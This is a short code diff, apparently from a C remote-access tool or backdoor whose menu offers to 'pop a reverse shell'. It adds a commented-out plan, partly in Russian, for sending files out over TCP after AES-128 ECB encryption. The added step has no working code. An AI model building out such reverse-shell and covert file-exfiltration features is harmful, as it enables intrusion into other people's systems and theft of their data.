@@ -95,6 +95,19 @@ Shell: pop a reverse shell\n2 - File: send or recieve a file UNIMPLEMENTED\n3 - 
             // Convert the binary IP address to a human-readable string
             handle_shell(sa, sockfd_u, _SIG_SHLL);
             break;
+        case 2:
+            // ЗДЕСЬ вызов файла 
+            /*
+            tcp socket open port TCP_PORT
+            send udp packet with file notifier
+            tcp socket await connection DO WITH 
+            get path from user
+            open file
+            aes 128 encrypt ECB
+            send file
+            clean up tcp etc
+
+            */
         default:
             DBGLG("Unimplemented, exiting\n");
             return;
